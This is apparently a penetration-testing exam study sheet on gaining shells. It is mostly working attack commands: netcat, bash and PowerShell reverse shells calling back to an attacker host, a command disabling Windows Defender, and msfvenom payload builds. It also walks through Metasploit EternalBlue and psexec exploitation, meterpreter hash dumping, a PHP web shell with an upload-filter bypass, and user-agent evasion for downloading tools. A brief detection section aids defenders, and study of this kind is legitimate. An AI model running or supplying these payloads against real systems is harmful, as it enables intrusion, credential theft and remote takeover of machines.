# Shells & Payloads

Shell = interactive OS access via exploit. Reverse = target calls back to attacker (outbound, bypasses inbound firewall). Bind = attacker connects to listener on target (blocked by strict ingress rules).

revshells.com — reverse shell generator reference. Reverse Shell Cheat Sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md Laudanum webshells: `/usr/share/laudanum/` | Nishang Antak: `/usr/share/nishang/Antak-WebShell/`

---

## Netcat — Bind & Reverse Shells

Bind shell (target listens, attacker connects):

```bash
# Target (server) — bind bash to TCP
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <TARGET_IP> <PORT> > /tmp/f

# Attacker (client) — connect
nc -nv <TARGET_IP> <PORT>
```

Reverse shell (attacker listens, target calls back):

```bash
# Attacker — start listener
sudo nc -lvnp 443

# Target — connect back
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <LHOST> 443 > /tmp/f
```

Netcat send/receive files:

```bash
# Receiver listens
nc -lvnp 8000 > <FILE>
ncat -l -p 8000 --recv-only > <FILE>

# Sender connects
nc -q 0 <TARGET> 8000 < <FILE>
ncat --send-only <TARGET> 8000 < <FILE>

# Bash fallback (no nc)
cat < /dev/tcp/<LHOST>/8000 > <FILE>
```

One-liner breakdown — `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <LHOST> <PORT> > /tmp/f`:

- `rm -f /tmp/f` — remove FIFO if exists
- `mkfifo /tmp/f` — create named pipe
- `cat /tmp/f |` — pipe FIFO to bash stdin
- `/bin/bash -i 2>&1 |` — interactive shell, stderr→stdout, pipe to nc
- `nc <LHOST> <PORT> > /tmp/f` — connect back, redirect output to FIFO (closes loop)

---

## PowerShell Reverse Shell

Disable AV first (if needed):

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

PowerShell reverse shell one-liner (run in cmd.exe on target):

```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Key parts: `TCPClient` = TCP socket to attacker. `iex $data` = execute received command. `$sendback2` = output + PS prompt. `$sendbyte` = encoded response sent back.

---

## msfvenom Payloads

Staged = `/` between components (`windows/shell/reverse_tcp` — stager then stage). Stageless = fused name (`windows/shell_reverse_tcp`). Staged = smaller initial stager but needs stable comms. Stageless = all-in-one, better for unstable links.

```bash
msfvenom -l payloads              # list all payloads

# Linux ELF stageless
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=443 -f elf > shell.elf

# Windows EXE stageless
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=443 -f exe > payload.exe

# Windows Meterpreter staged EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe > meter.exe

# ASPX webshell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx > shell.aspx

# PHP webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f raw > shell.php
```

Catch all msfvenom/MSF shells:

```
use multi/handler
set PAYLOAD <same payload used in msfvenom>
set LHOST tun0
set LPORT 4444
exploit -j
```

---

## Metasploit — Full Exploit Workflow

EternalBlue (MS17-010) example:

```
# 1. Check if vulnerable
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET>
run

# 2. Select exploit
use exploit/windows/smb/ms17_010_psexec
# or
use exploit/windows/smb/ms17_010_eternalblue

# 3. Set options
set RHOSTS <TARGET>
set LHOST tun0
set SMBUser <USER>    # if creds known
set SMBPass <PASS>    # if creds known

# 4. Run
exploit
```

PSExec (needs valid admin creds):

```
use exploit/windows/smb/psexec
set RHOSTS <TARGET>
set SHARE ADMIN$
set SMBUser <USER>
set SMBPass <PASS>
set LHOST tun0
exploit
```

---

## Meterpreter → System Shell

```
meterpreter > getuid               # current user
meterpreter > sysinfo              # OS info
meterpreter > shell                # drop to system shell (cmd.exe on Windows, sh on Linux)
meterpreter > ps                   # process list
meterpreter > migrate <PID>        # migrate to process
meterpreter > steal_token <PID>    # impersonate process token
meterpreter > hashdump             # dump SAM hashes (needs SYSTEM)
meterpreter > background           # background session
```

From system shell — identify shell type: prompt `C:\>` = cmd.exe. Prompt `PS C:\>` = PowerShell.

---

## Spawning Interactive / TTY Shells

Use when dropped into non-interactive/limited shell (no prompt, no job control, can't use `su`/`sudo`).

Python TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
which python python3   # check presence first
```

Other shell escapes:

```bash
/bin/sh -i
/bin/bash -i

perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e 'os.execute("/bin/sh")'

awk 'BEGIN {system("/bin/sh")}'

find / -name nameoffile -exec /bin/sh \; -quit
find . -exec /bin/sh \; -quit

vim -c ':!/bin/sh'
# inside vim:
:set shell=/bin/sh
:shell
```

Check permissions after landing:

```bash
sudo -l                # what can current user sudo
ls -la <path>          # file permissions
```

---

## Windows Fingerprinting

TTL fingerprinting via ping: Windows = ~128. Linux = ~64. macOS = ~64. (Subtract hops — if TTL ~128, likely Windows.)

```bash
ping <TARGET>            # TTL ~128 = Windows

nmap -v -O <TARGET>      # OS detection → "Microsoft Windows 10 1709-1909"
sudo nmap -v 192.168.x.x --script banner.nse   # banner grab per open port
```

Ports commonly open on Windows: 135 (MSRPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985/5986 (WinRM).

---

## Web Shells

### Laudanum (multi-language, pre-built)

```bash
ls /usr/share/laudanum/        # asp, aspx, php, jsp etc.
cp /usr/share/laudanum/aspx/shell.aspx ~/demo.aspx
```

Edit allowed IPs before uploading (line 59 in aspx shell). Upload via file upload functionality or FTP. Navigate to uploaded path in browser. Execute system commands via browser interface.

Bypass file type restriction (Burp): intercept upload → change `Content-Type: application/x-php` → `Content-Type: image/gif` → Forward. Tricks server into accepting non-image file.

### Antak (ASPX + PowerShell, Nishang)

```bash
ls /usr/share/nishang/Antak-WebShell/
cp /usr/share/nishang/Antak-WebShell/antak.aspx ~/Upload.aspx
```

Edit line 14 — set username and password before uploading. Provides PowerShell-like interface in browser. Can upload/download files, encode+execute scripts, run cmdlets.

### PHP Web Shell (WhiteWinterWolf)

```php
<?php system($_GET['cmd']); ?>
```

Upload as .php (bypass content-type check via Burp if needed). Access: `http://<TARGET>/uploads/shell.php?cmd=whoami`

PHP shell considerations: may auto-delete after timeout, limited interactivity, chained commands may fail, leaves traces. Use to establish foothold → upgrade to reverse shell → delete artifact.

---

## Infiltrating Linux — rConfig Example

```bash
# 1. Enumerate
nmap -sC -sV <TARGET>

# 2. Identify app + version from web/banner
# 3. Search for exploit
searchsploit rconfig 3.9.6
# or in msfconsole:
search rconfig
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
set RHOSTS <TARGET>
set LHOST tun0
exploit
```

After MSF shell — drop to system:

```
meterpreter > shell
# non-interactive → spawn TTY
python -c 'import pty; pty.spawn("/bin/sh")'
```

---

## Detection Indicators (Defender Perspective)

MITRE ATT&CK relevant tactics: T1190 (Exploit Public-Facing Application), T1059 (Command & Scripting Interpreter), T1105 (Ingress Tool Transfer), T1571 (Non-Standard Port).

Events to watch: file uploads to webserver dirs, `whoami`/`id`/`net user` from non-admin users, NetFlow anomalies on port 4444 or other non-standard ports, cleartext shell traffic (Wireshark shows full command output), connections to unexpected external IPs.

Netcat shell traffic is unencrypted — all commands + output visible in PCAP. MSF6 Meterpreter uses AES-encrypted comms = harder to detect at network layer.

User agent evasion (change PS UA to bypass blacklists):

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<LHOST>/nc.exe -UserAgent $UserAgent -OutFile nc.exe
```

Known suspicious user agents: `WindowsPowerShell/5.1` (Invoke-WebRequest), `Microsoft-CryptoAPI/10.0` (Certutil), `Microsoft BITS/7.8` (BITSAdmin), `WinHttp.WinHttpRequest.5` (WinHttp).

---

## Notable Windows Vulnerabilities (Exam Reference)

|CVE|Name|Notes|
|---|---|---|
|MS08-067|Conficker/Stuxnet|SMB, pre-Vista, wormable|
|MS17-010|EternalBlue|SMB v1, Win7-Server2016, WannaCry/NotPetya|
|CVE-2021-34527|PrintNightmare|Print Spooler RCE, low-priv → SYSTEM, DCs affected|
|CVE-2019-0708|BlueKeep|RDP pre-auth RCE, Win2000-Server2008 R2, BSOD risk|
|CVE-2021-36934|SeriousSam|SAM readable by non-admin via VSS, credential dump|
|CVE-2020-1472|Zerologon|MS-NRPC crypto flaw, domain takeover, ~256 guesses|
|CVE-2020-1350|SIGRed|DNS SIG record flaw, domain admin via DNS server|

> [!tip] Payload delivery decision tree: have creds + SMB open → psexec. No creds + MS17-010 vulnerable → EternalBlue. Web app upload available → webshell (Laudanum/Antak/PHP). Need social engineering delivery → msfvenom EXE/ELF. Need in-browser C2 → web shell + upgrade to reverse shell.

> [!warning] Always catch shells on common ports (443, 80, 53) — outbound traffic on these is rarely blocked. Non-standard ports like 4444 are easily flagged by IDS/SIEM. AV will block default msfvenom payloads — disable AV or use encoded/template payloads for lab practice.